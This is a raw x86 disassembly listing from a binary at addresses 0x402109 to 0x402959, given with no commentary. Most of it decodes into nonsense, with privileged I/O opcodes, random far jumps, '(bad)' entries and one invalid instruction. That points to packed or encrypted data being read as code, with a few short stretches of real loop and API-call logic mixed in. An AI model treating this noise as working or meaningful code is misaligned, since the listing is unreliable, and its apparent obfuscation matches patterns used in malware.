  402109:	and    edx,edx
  40210b:	test   DWORD PTR [edx-0x6f14ed72],ebp
  402111:	sub    cl,dl
  402113:	add    eax,0x1050af5
  402118:	div    BYTE PTR [esi+0x16]
  40211b:	fs inc ebp
  40211d:	retf   0x96f4
  402120:	jmp    0xea9ba29e
  402125:	inc    esi
  402126:	iret   
  402127:	cwde   
  402128:	inc    ebx
  402129:	jle    0x40212d
  40212b:	mov    al,ds:0x22c6cec
  402130:	mov    ds:0xfbd5debb,al
  402135:	out    0x2,al
  402137:	ret    
  402138:	push   ebp
  402139:	lods   eax,DWORD PTR ds:[esi]
  40213a:	inc    esi
  40213b:	daa    
  40213c:	jno    0x402128
  40213e:	icebp  
  40213f:	xchg   DWORD PTR [edx],ebx
  402141:	jo     0x402151
  402143:	cmc    
  402144:	aad    0x12
  402146:	ret    
  402147:	push   eax
  402148:	sbb    al,0x9a
  40214a:	aas    
  40214b:	idiv   BYTE PTR [edi+0x2a]
  40214e:	leave  
  40214f:	(bad)  [esi]
  402151:	inc    ebx
  402152:	ror    DWORD PTR [ebx+ebp*1],1
  402155:	out    0x8a,eax
  402157:	cwde   
  402158:	mov    ebx,0xa146a713
  40215d:	or     BYTE PTR [edx+0x78f3772a],al
  402163:	push   ecx
  402164:	scas   al,BYTE PTR es:[edi]
  402165:	xchg   ebx,eax
  402166:	jl     0x4021bd
  402168:	icebp  
  402169:	test   al,0x51
  40216b:	dec    ecx
  40216c:	cld    
  40216d:	out    dx,eax
  40216e:	mov    al,ds:0xc5768bba
  402173:	and    ah,bh
  402175:	call   0x41f0:0x13145e40
  40217c:	mov    edi,0x9a737914
  402181:	cli    
  402182:	test   edx,edx
  402184:	rol    DWORD PTR [ebp-0x569090d1],cl
  40218a:	call   0x32ae9947
  40218f:	cmp    DWORD PTR [eax-0x75599541],esp
  402195:	mov    bl,0x9f
  402198:	mov    dh,0x6e
  40219a:	xlat   BYTE PTR ds:[ebx]
  40219b:	and    ch,BYTE PTR [eax-0x53650031]
  4021a1:	or     al,0xb1
  4021a3:	nop
  4021a4:	pop    ebx
  4021a5:	js     0x4021cd
  4021a7:	push   esp
  4021a8:	imul   eax,DWORD PTR [esi-0x1a8f2d2c],0x3e69ad43
  4021b2:	in     eax,0x84
  4021b4:	in     eax,dx
  4021b5:	jb     0x402141
  4021b7:	repz mov eax,ds:0x852489f2
  4021bd:	and    BYTE PTR [edi-0x39],0xb5
  4021c1:	js     0x40223f
  4021c3:	cli    
  4021c4:	fldcw  WORD PTR [edi+0x5eabcfe0]
  4021ca:	jl     0x4021be
  4021cc:	outs   dx,DWORD PTR ds:[esi]
  4021cd:	dec    edx
  4021ce:	sub    bl,BYTE PTR [ebp+0x2]
  4021d1:	ins    DWORD PTR es:[edi],dx
  4021d2:	inc    ecx
  4021d3:	add    DWORD PTR [ecx+edi*1+0x6d40a91e],edi
  4021da:	shr    BYTE PTR [eax-0x59],0xfd
  4021de:	imul   eax,ebp,0xce22dba4
  4021e4:	and    bl,BYTE PTR [ecx+0x5ada080d]
  4021ea:	mov    ds:0x76f0e0f1,al
  4021ef:	jae    0x402187
  4021f1:	mov    ebx,0xe3ad4074
  4021f6:	mov    BYTE PTR [edi-0x115fd05],bl
  4021fc:	push   edx
  4021fd:	loop   0x40220e
  4021ff:	leave  
  402200:	dec    esi
  402201:	mov    al,ds:0x3720f14e
  402206:	int    0xf
  402208:	call   DWORD PTR [ebx+0x4d882706]
  40220e:	mov    ch,0x56
  402210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402211:	(bad)  
  402212:	xor    DWORD PTR ds:0x56506efa,ecx
  402218:	adc    ecx,DWORD PTR [esi]
  40221a:	jns    0x40225b
  40221c:	add    al,0xa4
  40221e:	enter  0x5980,0x26
  402222:	sub    cl,BYTE PTR [ecx]
  402224:	in     al,0x36
  402226:	enter  0xb952,0x76
  40222a:	inc    ebx
  40222b:	jecxz  0x4021ba
  40222d:	je     0x402210
  40222f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402230:	out    dx,eax
  402231:	add    al,bh
  402233:	push   esi
  402234:	test   DWORD PTR [ebx+0x23],ebx
  402237:	(bad)  
  402238:	inc    edi
  402239:	push   0x6f40fc6f
  40223e:	or     DWORD PTR fs:[esi+0x72],esp
  402242:	sub    eax,0x6082076b
  402247:	pop    esp
  402248:	xchg   BYTE PTR [edx-0x37],ch
  40224b:	aad    0x11
  40224d:	inc    edx
  40224e:	xor    BYTE PTR [ebx+0x5a],bl
  402251:	mov    ch,0x77
  402253:	add    eax,0x3faafbc3
  402258:	sar    DWORD PTR [ecx-0x408e720b],1
  40225e:	retf   
  40225f:	xor    ebp,ebp
  402261:	inc    esp
  402262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402263:	mov    ds:0x60e82fc5,al
  402268:	push   cs
  402269:	jg     0x40225e
  40226b:	or     DWORD PTR ds:0x4a04249b,ecx
  402271:	pop    edx
  402272:	jnp    0x4022c2
  402274:	daa    
  402275:	jle    0x4022b5
  402277:	or     al,0x7e
  402279:	mov    eax,ds:0xb2091485
  40227e:	xchg   DWORD PTR [ecx],ebp
  402280:	not    DWORD PTR [edi+0x15]
  402283:	mov    dl,BYTE PTR [edi+0x49]
  402286:	xchg   edi,eax
  402287:	ret    0xf67a
  40228a:	push   ds
  40228b:	mov    eax,ds:0x7223d1cc
  402290:	aaa    
  402291:	xor    DWORD PTR [ebp-0x1c9c9894],eax
  402297:	push   esp
  402298:	cmp    DWORD PTR [edx+0x42381dd0],edx
  40229e:	and    BYTE PTR [ebp+0x5b],0xbd
  4022a2:	xchg   edi,eax
  4022a3:	jns    0x40230b
  4022a5:	pop    esi
  4022a6:	ficom  WORD PTR [edx]
  4022a8:	icebp  
  4022a9:	cmp    ebx,0xf7dec369
  4022af:	mov    ecx,ebx
  4022b1:	call   0xa69:0x9300cdd2
  4022b8:	or     eax,0x5641471
  4022bd:	cmp    ah,BYTE PTR [ebx]
  4022bf:	mov    ds:0x3ade4242,al
  4022c4:	(bad)  
  4022c5:	hlt    
  4022c6:	and    dh,dl
  4022c8:	xor    bl,BYTE PTR [esi]
  4022ca:	xor    DWORD PTR [ebp-0xe674801],edi
  4022d0:	jmp    0x9e224a18
  4022d5:	xchg   ebp,eax
  4022d6:	xchg   esi,eax
  4022d7:	xor    BYTE PTR [ebp+0x6e],bl
  4022da:	and    eax,0xa8bc77a3
  4022df:	and    al,0xbd
  4022e1:	aaa    
  4022e2:	inc    esp
  4022e3:	(bad)  
  4022e5:	std    
  4022e6:	jne    0x4022a7
  4022e8:	sub    eax,0xf4f2e039
  4022ed:	cdq    
  4022ee:	sbb    DWORD PTR [edi],ebx
  4022f0:	mov    dl,0xd5
  4022f2:	cmp    DWORD PTR [eax],ebx
  4022f4:	fcmovu st,st(1)
  4022f6:	sahf   
  4022f7:	lahf   
  4022f8:	add    eax,0xd08d5b77
  4022fd:	daa    
  4022fe:	mov    dh,0x80
  402300:	sbb    eax,0x53e74268
  402305:	sbb    BYTE PTR [ebx+0x5b],al
  402308:	rcr    DWORD PTR ss:[ebx],0xa6
  40230c:	pop    ebp
  40230d:	sbb    ecx,DWORD PTR [esi-0x55cd6a11]
  402313:	shl    DWORD PTR [eiz*8+0x3623fa5d],0x91
  40231b:	repnz mov ch,0x35
  40231e:	push   cs
  40231f:	scas   al,BYTE PTR es:[edi]
  402320:	mov    esi,0x706c63ae
  402325:	not    edx
  402327:	arpl   WORD PTR [edx+0xe],cx
  40232a:	outs   dx,DWORD PTR ds:[esi]
  40232b:	std    
  40232c:	mov    ds:0x7c9c37ac,eax
  402331:	push   0xffffffa0
  402333:	xor    esp,DWORD PTR [eax]
  402335:	rcr    cl,1
  402337:	test   cl,bh
  402339:	out    dx,al
  40233a:	iret   
  40233b:	cld    
  40233c:	and    bh,BYTE PTR [esi+0x7a]
  40233f:	jmp    0x4023a5
  402341:	inc    ebx
  402342:	mov    ch,0x11
  402344:	cmp    al,0xdd
  402346:	jo     0x40231a
  402348:	aas    
  402349:	sbb    ecx,DWORD PTR [esi-0x1b]
  40234c:	cdq    
  40234d:	pop    esi
  40234e:	shr    BYTE PTR [ecx],cl
  402350:	retf   0xcf77
  402353:	les    ebx,FWORD PTR [ecx+ebx*8-0x7284f5a8]
  40235a:	test   DWORD PTR [eax-0x1],ebp
  40235d:	(bad)  
  40235e:	inc    DWORD PTR [ebx-0x77]
  402361:	inc    ebp
  402362:	clc    
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433717,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4337fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43377b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43377b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43377b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43377b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43377b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4337bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4337f7
  4023d7:	or     DWORD PTR ds:0x433767,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433777,0x43383f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43376f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43376f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43376f,ecx
  40240a:	cmp    DWORD PTR ds:0x43376f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433910
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43376f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43376f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43376f,ecx
  402450:	cmp    DWORD PTR ds:0x43376f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx+0x2cd9ac70]
  402480:	sbb    DWORD PTR [eax-0x46],ebx
  402483:	add    DWORD PTR [esi+0x7e],edi
  402486:	outs   dx,DWORD PTR ds:[esi]
  402487:	jge    0x402507
  402489:	jle    0x40242b
  40248b:	stos   BYTE PTR es:[edi],al
  40248c:	les    edx,FWORD PTR [esp+edx*4-0x25]
  402490:	adc    eax,0x835f7756
  402495:	inc    ebp
  402496:	adc    DWORD PTR [esi-0x8],ecx
  402499:	aam    0x25
  40249b:	jne    0x4024b5
  40249d:	clc    
  40249e:	fild   QWORD PTR [edx-0x57b7aac7]
  4024a4:	std    
  4024a5:	fld    TBYTE PTR [esi-0x53c51c89]
  4024ab:	adc    eax,0x3b95032a
  4024b0:	outs   dx,BYTE PTR ds:[esi]
  4024b1:	xchg   ebx,eax
  4024b2:	scas   al,BYTE PTR es:[edi]
  4024b3:	push   ss
  4024b4:	retf   
  4024b5:	cmp    al,0x87
  4024b7:	gs popa 
  4024b9:	shl    BYTE PTR [edi-0x44],1
  4024bc:	(bad)  
  4024bd:	jne    0x4024ae
  4024bf:	lahf   
  4024c0:	lods   al,BYTE PTR ds:[esi]
  4024c1:	clc    
  4024c2:	ret    
  4024c3:	ins    BYTE PTR es:[edi],dx
  4024c4:	adc    ebp,DWORD PTR [edx+ebp*1]
  4024c7:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4024c9:	repnz xchg edx,eax
  4024cb:	ret    
  4024cc:	mov    ebp,0x8a4a0679
  4024d1:	jecxz  0x4024ab
  4024d3:	xor    eax,0x5b446a3e
  4024d8:	pop    ebx
  4024d9:	cmp    dl,bh
  4024db:	inc    esp
  4024dc:	xchg   esp,eax
  4024dd:	into   
  4024de:	(bad)  
  4024e0:	adc    eax,0x84a6afbe
  4024e5:	mov    ebp,0x3a3d247d
  4024ea:	lock sti 
  4024ec:	loopne 0x40255d
  4024ee:	dec    edi
  4024ef:	mov    esi,0x19ea5674
  4024f4:	pop    edi
  4024f5:	xchg   esi,eax
  4024f6:	mov    ebp,0x986f8055
  4024fb:	sbb    dh,bl
  4024fd:	inc    ebx
  4024fe:	imul   edx,esp,0x89cdbc2
  402504:	pop    ebp
  402505:	jmp    0xdff530e5
  40250a:	lock arpl WORD PTR [ebp-0x29cd2174],dx
  402511:	sbb    ah,BYTE PTR [eax]
  402513:	add    eax,0x22d3ea5f
  402518:	(bad)  
  402519:	mov    esp,0xd4ab8e0
  40251e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40251f:	sbb    edx,DWORD PTR [ebp-0x7e81f579]
  402525:	mov    ebx,0x47c70d4c
  40252a:	sbb    DWORD PTR [eax+0x20],edi
  40252d:	inc    esi
  40252e:	mov    bl,0xa5
  402530:	inc    esp
  402531:	xchg   ebp,eax
  402532:	mov    edi,0xfcad2c2e
  402537:	scas   eax,DWORD PTR es:[edi]
  402538:	imul   edx,DWORD PTR ds:0xc04b5020,0xd492b9a3
  402542:	fwait
  402543:	add    DWORD PTR [edi-0x3b],ebx
  402546:	sub    DWORD PTR [di+0x25],eax
  40254a:	mov    eax,ds:0xa6b03298
  40254f:	pop    ebp
  402550:	or     al,0x22
  402552:	stos   BYTE PTR es:[edi],al
  402553:	ret    
  402554:	cmp    DWORD PTR [edx-0x4d],ebx
  402557:	push   eax
  402558:	loope  0x4025cc
  40255a:	jge    0x402568
  40255c:	dec    esi
  40255d:	push   0x47ac4532
  402562:	and    eax,0xe8b373be
  402567:	or     ah,BYTE PTR [ecx-0x30]
  40256a:	mov    edi,0xafd604a
  40256f:	call   0xa628:0xb61a434
  402576:	test   DWORD PTR [edi+0x61],ecx
  402579:	pop    eax
  40257a:	mov    bl,0x40
  40257c:	in     al,dx
  40257d:	scas   al,BYTE PTR es:[edi]
  40257e:	test   DWORD PTR [edx],ecx
  402580:	cld    
  402581:	dec    edx
  402582:	pop    edi
  402583:	(bad)  
  402584:	and    al,0xc
  402586:	push   ss
  402587:	jb     0x4025c2
  402589:	mov    ah,0x96
  40258b:	pop    esp
  40258c:	call   0x8ef6912f
  402591:	lods   eax,DWORD PTR ds:[esi]
  402592:	pop    ecx
  402593:	dec    ebp
  402594:	pop    ebp
  402595:	or     ah,al
  402597:	add    al,0xf6
  402599:	in     eax,0xe8
  40259b:	outs   dx,BYTE PTR ds:[esi]
  40259c:	adc    edi,eax
  40259e:	lods   al,BYTE PTR ds:[esi]
  40259f:	and    DWORD PTR [edx+0x35],esi
  4025a2:	in     eax,0x36
  4025a4:	adc    eax,0xce119b15
  4025a9:	pusha  
  4025aa:	xchg   ecx,eax
  4025ab:	jae    0x40256b
  4025ad:	mov    dh,0x84
  4025af:	pop    esi
  4025b0:	pushf  
  4025b1:	cmp    eax,0x245a7fc4
  4025b6:	pop    ebp
  4025b7:	mov    eax,0xdc3a1579
  4025bc:	mov    dh,0x95
  4025be:	jl     0x402610
  4025c0:	jecxz  0x402589
  4025c2:	fdivr  QWORD PTR [edx]
  4025c4:	fist   WORD PTR [eax]
  4025c6:	mov    dh,0x4
  4025c8:	and    ebp,eax
  4025ca:	add    ah,al
  4025cc:	mov    ecx,0xde69c717
  4025d1:	pop    ds
  4025d2:	push   edi
  4025d3:	adc    eax,0x9178d4f0
  4025d8:	inc    ecx
  4025d9:	je     0x402612
  4025db:	push   edi
  4025dc:	shl    DWORD PTR [ecx],1
  4025de:	js     0x402615
  4025e0:	pusha  
  4025e1:	jno    0x4025b7
  4025e3:	ins    BYTE PTR es:[edi],dx
  4025e4:	mov    ch,BYTE PTR ds:0x64530ba6
  4025ea:	addr16 ja 0x40259c
  4025ed:	jne    0x4025d6
  4025ef:	push   edi
  4025f0:	loopne 0x40258a
  4025f2:	sub    DWORD PTR [ecx-0x4c6c52be],ebp
  4025f8:	or     al,BYTE PTR [ecx-0x5a05fbe3]
  4025fe:	call   0x5e49a849
  402603:	call   0x9b25d843
  402608:	jl     0x4025e1
  40260a:	mov    gs,WORD PTR [eax+0x2cb333ab]
  402610:	ret    0xace
  402613:	pop    es
  402614:	sbb    DWORD PTR [edx+edx*1+0x3e],ecx
  402618:	sbb    eax,0x5abb2c35
  40261d:	pop    ss
  40261e:	stos   BYTE PTR es:[edi],al
  40261f:	ret    0xea52
  402622:	add    DWORD PTR [esi],esp
  402624:	(bad)  
  402625:	cmp    BYTE PTR [edi-0x22],cl
  402628:	outs   dx,DWORD PTR ds:[esi]
  402629:	into   
  40262a:	jno    0x40262f
  40262c:	xchg   DWORD PTR [eax+0x64e911c8],esi
  402632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402633:	add    al,0x5f
  402635:	lock cmp DWORD PTR [edx+0x6134ed39],ebx
  40263c:	mov    eax,0x3802de09
  402641:	xchg   BYTE PTR [edi-0x62ab2243],ah
  402647:	jmp    0x402600
  402649:	lods   eax,DWORD PTR ds:[esi]
  40264a:	inc    ebp
  40264b:	push   ecx
  40264c:	xlat   BYTE PTR ds:[ebx]
  40264d:	in     al,0xa1
  40264f:	mov    esi,0x8c64fbcb
  402654:	xor    BYTE PTR [eax],dh
  402656:	xor    al,0xf3
  402658:	hlt    
  402659:	pop    edx
  40265a:	sbb    ebx,esp
  40265c:	js     0x40268b
  40265e:	scas   eax,DWORD PTR es:[edi]
  40265f:	mov    ebx,0x7ccb8723
  402664:	call   0x90fc:0x5a52c256
  40266b:	sub    al,0x49
  40266d:	mov    edi,DWORD PTR [esi-0x40]
  402670:	arpl   WORD PTR [edi],si
  402672:	repz add ebx,esi
  402675:	lods   al,BYTE PTR es:[esi]
  402677:	ss sbb eax,0xe9426af6
  40267d:	cmp    al,0x6c
  40267f:	push   ds
  402680:	(bad)  
  402681:	fmul   QWORD PTR [esi]
  402683:	mov    dh,0x8c
  402685:	mov    BYTE PTR [eax],al
  402687:	sar    BYTE PTR [eax-0xf],1
  40268a:	cmp    eax,0xddb9d5d
  40268f:	push   edi
  402690:	sub    DWORD PTR [eax+0x7f],esp
  402693:	mov    cl,0xc6
  402695:	in     al,0xfd
  402697:	cmp    al,0x57
  402699:	lds    edx,FWORD PTR [eax+ebx*8+0x2205fea1]
  4026a0:	icebp  
  4026a1:	scas   eax,DWORD PTR es:[edi]
  4026a2:	pop    ds
  4026a3:	inc    esi
  4026a4:	jb     0x40266b
  4026a6:	cld    
  4026a7:	in     eax,dx
  4026a8:	dec    ecx
  4026a9:	shr    BYTE PTR [eax-0x6e54a907],1
  4026af:	out    dx,eax
  4026b0:	mov    eax,0x7e8b87c5
  4026b5:	cwde   
  4026b6:	hlt    
  4026b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026b8:	clc    
  4026b9:	adc    ch,BYTE PTR [ecx+0x58609811]
  4026bf:	dec    ebx
  4026c0:	mov    eax,0x417742e5
  4026c5:	enter  0xbd36,0xfd
  4026c9:	push   0x43a5249b
  4026ce:	adc    DWORD PTR [edx+0x7a80d2ba],esp
  4026d4:	add    ch,BYTE PTR [ecx+0x0]
  4026d7:	push   edi
  4026d8:	and    ebp,ecx
  4026da:	cmp    dl,BYTE PTR [esi+0x7bd6e7f3]
  4026e0:	rcr    DWORD PTR [edx+eiz*2-0x2d77292c],1
  4026e7:	gs pop edx
  4026e9:	inc    ebx
  4026ea:	pop    ds
  4026eb:	jno    0x4026a3
  4026ed:	mov    ch,0xde
  4026ef:	fsub   DWORD PTR [eax+edi*2+0x0]
  4026f3:	mov    edx,0x4e9ea05d
  4026f8:	mov    dl,0xb1
  4026fa:	adc    dh,BYTE PTR [esi+eiz*1+0x36]
  4026fe:	inc    ebp
  4026ff:	inc    esi
  402700:	(bad)  
  402702:	mov    esi,0x79e59501
  402707:	mov    ds:0xd0c46e6,eax
  40270c:	push   ebx
  40270d:	push   ecx
  40270e:	leave  
  40270f:	je     0x4026e0
  402711:	add    eax,0x761f5d31
  402716:	aaa    
  402717:	add    eax,0x5dd9a6e6
  40271c:	pop    ds
  40271d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40271e:	repnz ficomp WORD PTR [eax]
  402721:	pop    eax
  402722:	mov    cl,ah
  402724:	cmc    
  402725:	ja     0x4026f9
  402727:	jo     0x40273d
  402729:	in     eax,dx
  40272a:	cmp    al,0x5
  40272c:	sub    eax,0x76c764d
  402731:	adc    BYTE PTR [edx],dl
  402733:	pop    ebx
  402734:	or     BYTE PTR [ecx],ch
  402736:	(bad)  
  402738:	dec    edx
  402739:	mov    eax,ds:0xa5db6198
  40273e:	push   ds
  40273f:	xchg   edi,eax
  402740:	outs   dx,BYTE PTR ds:[esi]
  402741:	test   eax,0xa42d282a
  402746:	xchg   ecx,eax
  402747:	mov    bh,0x88
  402749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40274a:	xor    BYTE PTR [edx-0x22ec3347],dl
  402750:	aam    0x96
  402752:	outs   dx,WORD PTR ds:[esi]
  402754:	lods   al,BYTE PTR ds:[esi]
  402755:	sub    al,0xf1
  402757:	cmp    DWORD PTR [eax-0x270f58f4],eax
  40275d:	xor    al,BYTE PTR [edi-0x53f47097]
  402763:	mov    esi,0xf8448396
  402768:	fimul  WORD PTR [edi+0x3]
  40276b:	sbb    al,0x7a
  40276d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40276e:	cmp    eax,0xb47ce7e6
  402773:	imul   ebx,DWORD PTR [ebx-0x2fb20fd4],0x7c7dbb8b
  40277d:	repnz push esp
  40277f:	pop    edx
  402780:	pop    eax
  402781:	retf   0xfb92
  402784:	adc    ebx,DWORD PTR [eax+0x6c]
  402787:	stc    
  402788:	mov    cl,0xba
  40278a:	outs   dx,BYTE PTR ds:[esi]
  40278b:	mov    ebx,0xdb430f07
  402790:	mov    esi,0x22ba013
  402795:	mov    esp,0x5f480e2e
  40279a:	sbb    ch,BYTE PTR [eax]
  40279c:	and    ecx,DWORD PTR [edx+ebp*8]
  40279f:	push   ebx
  4027a0:	enter  0xc53b,0x1d
  4027a4:	dec    ecx
  4027a5:	sbb    eax,0xab73a62e
  4027aa:	cmp    ch,BYTE PTR ds:0x7debd57e
  4027b0:	sub    dh,BYTE PTR [ecx]
  4027b2:	adc    BYTE PTR [edi+0x29425dba],ch
  4027b8:	pop    ds
  4027b9:	xchg   ah,al
  4027bb:	outs   dx,BYTE PTR ds:[esi]
  4027bc:	add    BYTE PTR [ecx+0x22],0x50
  4027c0:	xor    ecx,DWORD PTR [ebp-0xc]
  4027c3:	pushf  
  4027c4:	xlat   BYTE PTR ds:[ebx]
  4027c5:	cmp    ch,BYTE PTR [edi-0x11]
  4027c8:	test   ebp,0xd434c9db
  4027ce:	dec    ecx
  4027cf:	das    
  4027d0:	xor    eax,0x24b479af
  4027d5:	xchg   ebp,eax
  4027d6:	xlat   BYTE PTR ds:[ebx]
  4027d7:	les    ebp,FWORD PTR [ebx]
  4027d9:	sub    ecx,eax
  4027db:	xchg   DWORD PTR [ecx-0x2d],esi
  4027de:	push   edx
  4027df:	inc    esp
  4027e0:	xor    al,0x84
  4027e2:	inc    ecx
  4027e3:	sub    al,0x54
  4027e5:	dec    ecx
  4027e6:	bswap  eax
  4027e8:	mov    edi,0x4058c406
  4027ed:	les    edx,FWORD PTR [esi+0x349216b4]
  4027f3:	ja     0x40277d
  4027f5:	into   
  4027f6:	fwait
  4027f7:	sub    al,0x23
  4027f9:	jns    0x40286f
  4027fb:	sbb    eax,esi
  4027fd:	and    eax,0x77e9452
  402802:	mov    ah,0xec
  402804:	inc    ebx
  402805:	ins    DWORD PTR es:[edi],dx
  402806:	clc    
  402807:	les    ebp,FWORD PTR [ecx+0x72]
  40280a:	ffreep st(6)
  40280c:	test   eax,0xf53a5543
  402811:	jns    0x4027a9
  402813:	xor    ah,al
  402815:	cmp    esi,DWORD PTR [ebp-0x5b35a2a3]
  40281b:	and    BYTE PTR [eax+ebp*2+0x3],cl
  40281f:	or     DWORD PTR [edx+0x17],0x52c4593b
  402826:	stos   DWORD PTR es:[edi],eax
  402827:	dec    edx
  402828:	xchg   edx,eax
  402829:	pushf  
  40282a:	jl     0x4027f5
  40282c:	xor    edi,ebx
  40282e:	rcr    BYTE PTR [edi-0x3c],0xff
  402832:	xor    eax,0x647adaad
  402837:	and    BYTE PTR [eax-0x22],bl
  40283a:	stos   DWORD PTR es:[edi],eax
  40283b:	cli    
  40283c:	stc    
  40283d:	lods   eax,DWORD PTR ds:[esi]
  40283e:	jmp    0x4447:0x7a629f6c
  402845:	js     0x40283b
  402847:	xor    eax,0xf87cf3c7
  40284c:	xor    al,0x53
  40284e:	xchg   BYTE PTR [ebp-0x10936468],ah
  402854:	mov    cl,0x3d
  402856:	mov    edi,0x3fe79129
  40285b:	and    al,BYTE PTR [ecx]
  40285d:	and    eax,0x2d4df3dc
  402862:	mov    fs,WORD PTR [edi-0x3d7a3231]
  402868:	mov    ch,0xa3
  40286a:	jmp    0x759995c3
  40286f:	inc    esi
  402870:	das    
  402871:	xchg   DWORD PTR [eax-0x37],esi
  402874:	loop   0x40280e
  402876:	pushf  
  402877:	adc    DWORD PTR ds:0x418965d5,0x8
  40287e:	mov    eax,DWORD PTR [ebp-0x30]
  402881:	mov    ecx,DWORD PTR [ebp-0x8]
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx+0x60c1b792]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	and    al,0xf1
  4028d0:	cld    
  4028d1:	cmp    eax,0xf4bf3e12
  4028d6:	jl     0x4028cc
  4028d8:	cmc    
  4028d9:	aam    0x18
  4028db:	shr    DWORD PTR [ecx+ecx*8+0x56],1
  4028df:	or     al,0xad
  4028e1:	test   eax,0xb223a75e
  4028e6:	cli    
  4028e7:	(bad)  
  4028e8:	fst    DWORD PTR [ecx-0x36]
  4028eb:	retf   
  4028ec:	push   0x57
  4028ee:	imul   edx,DWORD PTR [edx+0x7aa822fe],0x7f
  4028f5:	shl    DWORD PTR [ebp+0x28],cl
  4028f8:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4028fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028fb:	aas    
  4028fc:	test   BYTE PTR [edi+0x3],bl
  4028ff:	jl     0x40290f
  402901:	push   es
  402902:	xchg   esi,eax
  402903:	repnz lea esi,[ebx-0x728201d8]
  40290a:	adc    edx,DWORD PTR [ebx-0x4602aa82]
  402910:	fcom   QWORD PTR [ebx+0x14]
  402913:	pusha  
  402914:	cmp    dh,dl
  402916:	sub    edi,eax
  402918:	adc    BYTE PTR [esi+edx*1-0x39f17ed0],bl
  40291f:	mov    ch,0x35
  402921:	les    ecx,FWORD PTR [ecx-0x3462f037]
  402927:	jo     0x4028b3
  402929:	mov    esi,0xe4945054
  40292e:	repnz mov ch,0x2
  402931:	scas   al,BYTE PTR es:[edi]
  402932:	sbb    eax,0x909725d9
  402937:	in     eax,0xcb
  402939:	pop    ebx
  40293a:	push   esi
  40293b:	or     bh,BYTE PTR [edi+0x24]
  40293e:	cs jl  0x4028fd
  402941:	sbb    ebp,esp
  402943:	pop    esp
  402944:	pop    ecx
  402945:	sti    
  402946:	mov    ?,esp
  402948:	(bad)
  40294b:	loope  0x402900
  40294d:	push   ebp
  40294e:	in     al,0x16
  402950:	mov    ecx,0xac6a3624
  402955:	inc    edx
  402956:	adc    esi,DWORD PTR [esi]
  402958:	xchg   esi,eax
  402959:	outs   dx,DWORD PTR ds:[esi]
